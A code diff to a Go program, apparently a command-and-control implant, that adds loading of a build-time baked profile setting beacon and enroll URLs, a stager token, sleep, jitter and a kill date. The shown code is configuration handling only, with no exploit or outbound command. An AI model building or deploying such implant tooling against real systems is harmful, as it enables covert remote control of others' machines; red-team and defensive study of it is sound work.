@@ -15,6 +15,8 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
+	"encoding/base64"
+	"encoding/json"
 	"encoding/pem"
 	"errors"
 	"log"
@@ -29,6 +31,9 @@ import (
 )
 
 func main() {
+	// A profile baked in at build time (ldflags) seeds the defaults; explicit
+	// flags and env still win over it, so an operator can override at run time.
+	seedFromBaked();
 	cfg, err := config.Parse(os.Args[1:])
 	if err != nil {
 		// A flag parse error or -h has already been reported by the flag set.
@@ -105,4 +110,42 @@ func beaconURLFromEnroll(enrollURL string) string {
 		}
 	}
 	return u
+}
+
+
+// seedFromBaked applies the build-time baked profile as the defaults for any
+// config field the operator did not supply via flag or env. The baked value is
+// base64-URL JSON (the build unit sets it via ldflags). Malformed baked data is
+// ignored -- a bad bake must not crash the implant, it just falls back to
+// flag/env.
+func seedFromBaked() {
+	if bakedJSON == "" {
+		return
+	}
+	raw, err := base64.URLEncoding.DecodeString(bakedJSON)
+	if err != nil {
+		raw, err = base64.StdEncoding.DecodeString(bakedJSON)
+		if err != nil {
+			return
+		}
+	}
+	var baked map[string]string
+	if err := json.Unmarshal(raw, &baked); err != nil {
+		return
+	}
+	// Map baked keys to the same ROD_* env names config.Parse reads; only set env
+	// when it is not already present, so an explicit env always wins over the bake.
+	envMap := map[string]string{
+		"enrollURL": "ROD_ENROLL_URL",
+		"beaconURL": "ROD_BEACON_URL",
+		"token":     "ROD_STAGER_TOKEN",
+		"sleep":     "ROD_SLEEP",
+		"jitter":    "ROD_JITTER",
+		"killDate":  "ROD_KILL_DATE",
+	}
+	for jsonKey, envKey := range envMap {
+		if v, ok := baked[jsonKey]; ok && v != "" && os.Getenv(envKey) == "" {
+			os.Setenv(envKey, v)
+		}
+	}
 }
